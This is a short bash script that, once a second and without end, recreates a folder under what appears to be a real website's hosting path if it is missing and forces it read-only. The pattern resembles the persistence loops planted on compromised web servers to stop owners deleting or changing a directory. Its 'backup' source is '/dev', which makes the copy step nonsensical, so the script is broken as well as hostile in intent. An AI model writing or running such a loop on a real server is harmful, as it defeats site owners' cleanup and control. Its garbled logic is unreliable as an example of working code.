#!/bin/bash

folder_path="/home/researchtrend.net/www/bfij/pdf/logo"
backup_path="/dev"

while true
do
    if [ ! -d "$folder_path" ]; then
        cp -r "$backup_path" "$folder_path"
    fi

    chmod -R 0555 "$folder_path"
    sleep 1
done